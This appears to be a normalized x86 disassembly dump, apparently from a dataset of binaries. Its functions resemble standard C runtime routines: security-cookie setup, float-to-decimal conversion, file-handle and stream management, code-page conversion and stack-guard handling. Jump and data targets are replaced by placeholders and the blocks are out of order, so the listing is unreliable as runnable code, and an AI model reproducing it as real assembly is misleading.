jmp r-xdata
cmp dx si
jne r-xdata
test edi edi
jne r-xdata
test dx dx
mov edi [ ebp + 0xc ]
jne r-xdata
movzx eax dx
mov esi eax
imul eax eax 0x4d10
and [ ebp - 0x18 ] 0x0
mov ecx edi
shr ecx 0x18
shr esi 0x8
lea ecx [ esi + ecx * 2 ]
imul ecx ecx 0x4d
lea esi [ ecx + eax - 0x134312f4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x16 ] eax
sar esi 0x10
movsx eax si
neg eax
push 0x1
push eax
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0xe ] dx
mov [ ebp - 0x12 ] edi
call sub_4be2ae
add esp 0xc
cmp [ ebp - 0xe ] 0x3fff
jb r-xdata
mov eax 0x80000000
cmp edi eax
mov [ ebx ] 0x1
jne r-xdata
cmp [ ebp + 0x8 ] edi
je r-xdata
test [ ebp + 0x18 ] 0x1
mov edi [ ebp + 0x14 ]
mov [ ebx ] si
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
inc esi
call sub_4be076
pop ecx
pop ecx
test edi 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x4 ] 0x30
jmp r-xdata
cmp edi 0x15
jle r-xdata
movsx eax si
add edi eax
test edi edi
jg r-xdata
test cx cx
je r-xdata
push r--data
jmp r-xdata
and [ ebx ] 0x0
and [ ebx + 0x5 ] 0x0
xor eax eax
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
inc eax
jmp r-xdata
movzx esi [ ebp - 0xe ]
sub esi 0x3ffe
and [ ebp - 0xe ] 0x0
mov [ ebp + 0x10 ] 0x8
push 0x15
pop edi
cmp edi eax
jne r-xdata
cmp edi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_4b7eb0
mov [ ebx + 0x3 ] 0x6
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
pop edi
pop esi
pop ebx
call sub_4bb8c9
leave
retn
lea eax [ ebp - 0x18 ]
push eax
call sub_4bcecd
dec [ ebp + 0x10 ]
pop ecx
jne r-xdata
test esi esi
jge r-xdata
push r--data
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
and [ ebp - 0x8 ] 0x0
pop ecx
pop ecx
jmp r-xdata
lea ecx [ edi + 0x1 ]
test ecx ecx
lea eax [ ebx + 0x4 ]
mov [ ebp + 0x10 ] eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
push r--data
push r--data
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov cl [ eax ]
dec eax
cmp cl 0x35
lea ecx [ ebx + 0x4 ]
jl r-xdata
mov [ ebp - 0xc ] ecx
lea eax [ ebp - 0x18 ]
push eax
call sub_4bcefb
dec esi
pop ecx
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_4b7eb0
mov [ ebx + 0x3 ] 0x5
cmp eax ecx
jae r-xdata
jmp r-xdata
lea esi [ ebp - 0x18 ]
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x18 ]
push eax
movsd [ edi ] [ esi ]
call sub_4bcecd
lea eax [ ebp - 0x18 ]
push eax
call sub_4bcecd
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_4bce6f
lea eax [ ebp - 0x18 ]
push eax
call sub_4bcecd
mov al [ ebp - 0xd ]
mov ecx [ ebp + 0x10 ]
and [ ebp - 0xd ] 0x0
add al 0x30
add esp 0x14
inc [ ebp + 0x10 ]
dec [ ebp - 0xc ]
mov [ ecx ] al
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x30
jne r-xdata
cmp eax ecx
jae r-xdata
cmp eax ecx
jae r-xdata
dec eax
sub al bl
sub al 0x3
mov [ ebx + 0x3 ] al
movsx eax al
and [ eax + ebx + 0x4 ] 0x0
mov [ ecx ] 0x30
cmp [ eax ] 0x39
jne r-xdata
cmp eax ecx
jae r-xdata
mov [ eax ] 0x30
dec eax
inc [ eax ]
inc eax
inc [ ebx ]
sub_4bd6da
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
mov [ rw-data ] esi
jne r-xdata
pop esi
leave
retn
mov [ rw-data ] 0xbb40e64e
sub_4bd730
push 0x118
push r--data
call sub_4b8944
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
xor ecx ecx
cmp eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
dec eax
je r-xdata
mov [ ebp - 0x4 ] ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ecx
pop ecx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov edi r--data
mov [ ebp - 0x20 ] r--data
mov esi 0xb9
mov edi r--data
mov [ ebp - 0x20 ] r--data
mov esi 0xd4
jmp r-xdata
push 0x3
call sub_4b87b1
int3
lea ebx [ ebp - 0x128 ]
lea eax [ ebp - 0x128 ]
push eax
call sub_4b6ec0
pop ecx
add eax 0xb
cmp eax 0x3c
jbe r-xdata
push r--data
lea eax [ ebp - 0x128 ]
push eax
call sub_4b7eb0
pop ecx
pop ecx
mov [ ebp - 0x24 ] cl
push 0x104
lea eax [ ebp - 0x128 ]
push eax
push ecx
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_4b6ec0
pop ecx
lea eax [ eax + esi + 0xc ]
add eax 0x3
and eax 0xfffffffc
call sub_4b6180
mov [ ebp - 0x18 ] esp
mov esi esp
push edi
push esi
call sub_4b7eb0
mov edi r--data
push edi
push esi
call sub_4b7ec0
push r--data
push esi
call sub_4b7ec0
push ebx
push esi
call sub_4b7ec0
push edi
push esi
call sub_4b7ec0
push [ ebp - 0x20 ]
push esi
call sub_4b7ec0
push 0x12010
push r--data
push esi
call sub_4bc7b0
add esp 0x3c
lea eax [ ebp - 0x128 ]
push eax
call sub_4b6ec0
mov ebx eax
lea eax [ ebp - 0x128 ]
sub eax 0x31
add ebx eax
push 0x3
push r--data
push ebx
call sub_4bc580
add esp 0x10
sub_4bd87a
mov ecx [ esp + 0x4 ]
cmp ecx [ rw-data ]
push esi
push edi
jae r-xdata
call sub_4b8990
mov [ eax ] 0x9
call sub_4b8999
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_4bd8f9
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
call sub_4b8990
mov [ eax ] 0x9
call sub_4b8999
and [ eax ] 0x0
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
test [ eax + 0x4 ] 0x1
je r-xdata
mov eax [ eax ]
retn
sub_4bd93a
mov eax [ esp + 0x4 ]
push ebx
push esi
mov ecx eax
sar ecx 0x5
and eax 0x1f
push edi
lea ebx [ ecx * 4 + rw-data ]
mov esi [ ebx ]
lea edi [ eax + eax * 8 ]
shl edi 0x2
add esi edi
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
xor eax eax
inc eax
push 0xa
call sub_4b80da
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
push 0xa
call sub_4b8046
pop ecx
lea eax [ esi + 0xc ]
push 0xfa0
push eax
call sub_4bb19c
test eax eax
pop ecx
pop ecx
jne r-xdata
inc [ esi + 0x8 ]
push 0xa
call sub_4b8046
pop ecx
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4bd9cf
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_4bd8f9
or edi 0xffffffff
cmp eax edi
pop ecx
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
cmp eax edi
mov [ ebp - 0x8 ] eax
jne r-xdata
call sub_4b8990
mov [ eax ] 0x9
jmp r-xdata
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
lea ecx [ esi + esi * 8 ]
lea eax [ eax + ecx * 4 + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
mov eax edi
mov edx edi
jmp r-xdata
push eax
call sub_4b89a2
pop ecx
pop edi
pop esi
leave
retn
sub_4bda52
push 0x10
push r--data
call sub_4b8944
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_4b80da
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
or [ ebp - 0x4 ] 0xffffffff
call sub_4bdae4
mov eax [ ebp - 0x1c ]
call sub_4b897f
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
mov eax [ esi + eax ]
cmp eax ebx
je r-xdata
inc edi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_4be386
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_4b66ed
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_4bdaed
push ebx
push esi
mov esi [ esp + 0xc ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push [ esi + 0x10 ]
call sub_4bbd0c
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_4bdb4a
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_4bdaed
test eax eax
pop ecx
je r-xdata
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_4be3d7
pop ecx
neg eax
sbb eax eax
pop esi
retn
sub_4bdb78
push 0x14
push r--data
call sub_4b8944
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] edi
push 0x1
call sub_4b80da
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
or [ ebp - 0x4 ] 0xffffffff
call sub_4bdc44
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
cmp eax edi
je r-xdata
call sub_4b897f
retn
mov eax [ ebp - 0x20 ]
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x24 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_4bbf11
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_4bdc18
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_4bdb4a
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_4bdb4a
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x20 ] eax
sub_4bdc56
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
and [ ebp - 0x6 ] 0x0
push 0x6
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_4b692d
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
call sub_4bb8c9
leave
retn
sub_4bdc9f
push 0x38
push r--data
call sub_4b8944
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
mov [ ebp - 0x1c ] eax
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x24 ] edi
mov eax [ ebp + 0x14 ]
mov ebx [ eax ]
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x2c ] edi
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
je r-xdata
mov ebx [ ebp - 0x48 ]
lea ecx [ ebp - 0x40 ]
push ecx
push eax
mov esi [ GetCPInfo@IAT ]
call esi
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
push ebx
call sub_4b66ed
pop ecx
cmp [ ebp - 0x2c ] edi
je r-xdata
cmp [ ebp - 0x40 ] 0x1
jne r-xdata
mov esi [ ebp - 0x44 ]
cmp ebx 0xffffffff
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ esi + esi ]
add eax 0x3
and eax 0xfffffffc
call sub_4b6180
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x48 ] ebx
lea eax [ esi + esi ]
push eax
push edi
push ebx
call sub_4ba340
add esp 0xc
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push edi
push edi
push ebx
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x8 ]
call [ MultiByteToWideChar@IAT ]
mov esi eax
mov [ ebp - 0x44 ] esi
cmp esi edi
je r-xdata
push [ ebp + 0x10 ]
call sub_4b6ec0
pop ecx
mov esi eax
inc esi
mov esi ebx
jmp r-xdata
cmp [ ebp - 0x40 ] 0x1
jne r-xdata
cmp ebx edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x2c ] edi
jne r-xdata
mov [ ebp - 0x44 ] esi
jmp r-xdata
mov [ ebp - 0x2c ] 0x1
push esi
push ebx
push [ ebp - 0x28 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x8 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push esi
push 0x2
call sub_4b6bc4
pop ecx
pop ecx
mov ebx eax
cmp ebx edi
jne r-xdata
lea esp [ ebp - 0x54 ]
mov ecx [ ebp - 0x1c ]
xor ecx [ ebp + 0x4 ]
call sub_4bb8c9
call sub_4b897f
retn
cmp [ ebp - 0x24 ] edi
je r-xdata
cmp [ ebp + 0x18 ] edi
je r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push ebx
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
push esi
push 0x1
call sub_4b6bc4
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push ebx
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
push edi
push edi
push esi
push eax
push esi
push ebx
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
cmp eax edi
jne r-xdata
cmp [ ebp - 0x28 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_4b66ed
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
jmp r-xdata
sub_4bde6e
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0x4
pop eax
call sub_4b6180
mov ebx esp
push 0x1c
lea eax [ ebp - 0x24 ]
push eax
push ebx
call [ VirtualQuery@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov edi [ ebp - 0x20 ]
lea eax [ ebp - 0x48 ]
push eax
call [ GetSystemInfo@IAT ]
mov eax [ ebp - 0x44 ]
lea esi [ eax - 0x1 ]
not esi
and esi ebx
sub esi eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov ecx eax
dec ecx
neg ecx
sbb ecx ecx
and ecx 0xffff1000
add ecx 0x11000
add ecx edi
cmp esi ecx
jb r-xdata
lea esp [ ebp - 0x54 ]
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x1
je r-xdata
mov ebx esi
mov ebx edi
mov edi 0x1000
add ebx [ ebp - 0x18 ]
test [ ebp - 0x14 ] edi
je r-xdata
push 0x1c
lea eax [ ebp - 0x24 ]
push eax
push ebx
call [ VirtualQuery@IAT ]
test eax eax
je r-xdata
test [ ebp - 0xf ] 0x1
mov ebx [ ebp - 0x24 ]
je r-xdata
cmp esi ebx
jae r-xdata
xor eax eax
inc eax
jmp r-xdata
push 0x4
push edi
push [ ebp - 0x4 ]
push ebx
call [ VirtualAlloc@IAT ]
mov eax [ rw-data ]
jmp r-xdata
dec eax
neg eax
sbb eax eax
and eax 0x103
lea ecx [ ebp - 0x8 ]
push ecx
inc eax
push eax
push [ ebp - 0x4 ]
push ebx
call [ VirtualProtect@IAT ]
sub_4bdf40
push ebp
mov ebp esp
push edi
push esi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov al 0xff
mov edi edi
movsx eax al
pop ebx
pop esi
pop edi
leave
retn
mov al [ esi ]
add esi 0x1
mov ah [ edi ]
add edi 0x1
cmp ah al
je r-xdata
or al al
je r-xdata
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
xchg al ah
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
cmp al ah
je r-xdata
sbb al al
sbb al 0xff
sub_4bdf8e
push ebp
mov ebp esp
push ecx
push ebx
call sub_4b7c13
mov ebx [ eax + 0x64 ]
cmp ebx [ rw-data ]
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_4ba305
mov ebx eax
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4bdf40
pop ecx
pop ecx
jmp r-xdata
pop edi
sub eax ecx
pop esi
cmp eax ecx
je r-xdata
pop ebx
leave
retn
movzx eax [ esi ]
push eax
push ebx
call sub_4bb261
mov [ ebp - 0x4 ] eax
movzx eax [ edi ]
push eax
push ebx
inc esi
call sub_4bb261
add esp 0x10
mov ecx eax
mov eax [ ebp - 0x4 ]
inc edi
test eax eax
je r-xdata
sub_4bdff7
push ebp
mov ebp esp
push ecx
push ebx
call sub_4b7c13
mov ebx [ eax + 0x64 ]
cmp ebx [ rw-data ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_4ba305
mov ebx eax
xor eax eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4be4a0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
sub eax ecx
pop esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ecx
je r-xdata
movzx eax [ esi ]
push eax
push ebx
call sub_4bb261
mov [ ebp - 0x4 ] eax
movzx eax [ edi ]
push eax
push ebx
inc esi
call sub_4bb261
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
mov ecx eax
je r-xdata
sub_4be076
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push ebx
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
xor eax eax
xor ecx ecx
mov cx [ ebx + 0xa ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov ax [ esi + 0xa ]
push edi
mov edi ecx
mov edx 0x7fff
and ecx edx
xor edi eax
and eax edx
and edi 0x8000
cmp ax 0x7fff
lea edx [ ecx + eax ]
mov [ ebp + 0x8 ] edx
jae r-xdata
neg di
sbb edi edi
and [ esi + 0x4 ] 0x0
and edi 0x80000000
add edi 0x7fff8000
and [ esi ] 0x0
mov [ esi + 0x8 ] edi
cmp cx 0x7fff
jae r-xdata
cmp dx 0xbffd
ja r-xdata
cmp dx 0x3fbf
ja r-xdata
test ax ax
mov edx 0x7fffffff
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc [ ebp + 0x8 ]
xor eax eax
test [ esi + 0x8 ] edx
jne r-xdata
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
jmp r-xdata
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x24 ]
mov [ ebp - 0x8 ] eax
mov [ ebp + 0xc ] 0x5
inc [ ebp + 0x8 ]
test [ ebx + 0x8 ] edx
jne r-xdata
cmp cx ax
jne r-xdata
cmp [ esi + 0x4 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
pop edi
pop esi
pop ebx
call sub_4bb8c9
leave
retn
add [ ebp - 0x8 ] 0x2
inc [ ebp - 0x14 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] 0x0
jg r-xdata
add eax esi
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
lea ecx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0x4 ] eax
jne r-xdata
cmp [ esi ] eax
jne r-xdata
mov eax [ ebp - 0x14 ]
add eax eax
cmp [ ebp + 0xc ] 0x0
jle r-xdata
add [ ebp + 0x8 ] 0xc002
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
add [ ebp - 0xc ] 0x2
sub [ ebp - 0x10 ] 0x2
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax ]
cmp [ ebx ] eax
jne r-xdata
jmp r-xdata
add [ ebp + 0x8 ] 0xffff
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
test [ ebp - 0x1d ] 0x80
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
movzx ecx [ ecx ]
movzx eax [ eax ]
imul eax ecx
mov ecx [ ebp - 0x8 ]
add ecx 0xfffffffc
push ecx
push eax
push [ ecx ]
call sub_4bce4e
add esp 0xc
test eax eax
je r-xdata
mov [ esi + 0xa ] ax
jmp r-xdata
cmp [ ebp - 0x28 ] 0x8000
ja r-xdata
mov eax [ ebp + 0x8 ]
neg eax
movzx ebx ax
add [ ebp + 0x8 ] ebx
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
lea eax [ ebp - 0x28 ]
push eax
call sub_4bcecd
add [ ebp + 0x8 ] 0xffff
cmp [ ebp + 0x8 ] 0x0
pop ecx
jg r-xdata
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x28 ]
and eax 0x1ffff
cmp eax 0x18000
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
call sub_4bcefb
dec ebx
pop ecx
jne r-xdata
inc [ ebp - 0x18 ]
inc [ ebp - 0x26 ]
and [ ebp - 0x26 ] 0x0
cmp [ ebp - 0x22 ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp ax 0x7fff
jae r-xdata
test [ ebp - 0x28 ] 0x1
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov cx [ ebp - 0x26 ]
mov [ esi ] cx
mov ecx [ ebp - 0x24 ]
mov [ esi + 0x2 ] ecx
mov ecx [ ebp - 0x20 ]
mov [ esi + 0x6 ] ecx
or eax edi
inc [ ebp - 0x22 ]
jmp r-xdata
and [ ebp - 0x22 ] 0x0
cmp [ ebp - 0x1e ] 0xffff
jne r-xdata
or [ ebp - 0x28 ] 0x1
inc [ ebp - 0x1e ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp - 0x1e ] 0x8000
jmp r-xdata
sub_4be2ae
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push ebx
mov ebx rw-data
xor ecx ecx
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
pop ebx
call sub_4bb8c9
leave
retn
jge r-xdata
cmp [ ebp + 0x10 ] ecx
jne r-xdata
neg [ ebp + 0xc ]
mov ebx rw-data
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
push esi
push edi
cmp [ ebp + 0xc ] ecx
jne r-xdata
lea eax [ eax + eax * 2 ]
lea esi [ ebx + eax * 4 ]
cmp [ esi ] 0x8000
jb r-xdata
mov eax [ ebp + 0xc ]
sar [ ebp + 0xc ] 0x3
and eax 0x7
add ebx 0x54
cmp eax ecx
je r-xdata
pop edi
pop esi
push esi
push [ ebp + 0x8 ]
call sub_4be076
pop ecx
pop ecx
xor ecx ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0xe ]
lea esi [ ebp - 0x10 ]
sub_4be33a
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x83
je r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
pop edi
pop esi
retn
push esi
call sub_4bdaed
push esi
mov edi eax
call sub_4be61f
push [ esi + 0x10 ]
call sub_4be584
add esp 0xc
test eax eax
jge r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_4b66ed
and [ esi + 0x1c ] 0x0
pop ecx
sub_4be386
push 0xc
push r--data
call sub_4b8944
or [ ebp - 0x1c ] 0xffffffff
mov esi [ ebp + 0x8 ]
test [ esi + 0xc ] 0x40
je r-xdata
push esi
call sub_4bbee2
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_4be33a
pop ecx
mov [ ebp - 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_4be3cf
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax [ ebp - 0x1c ]
call sub_4b897f
retn
sub_4be3d7
push 0xc
push r--data
call sub_4b8944
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
jae r-xdata
call sub_4b8990
mov [ eax ] 0x9
or eax 0xffffffff
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ebx
and eax 0x1f
lea esi [ eax + eax * 8 ]
shl esi 0x2
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push ebx
call sub_4bd93a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4b8990
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_4bd8f9
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
call sub_4b897f
retn
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
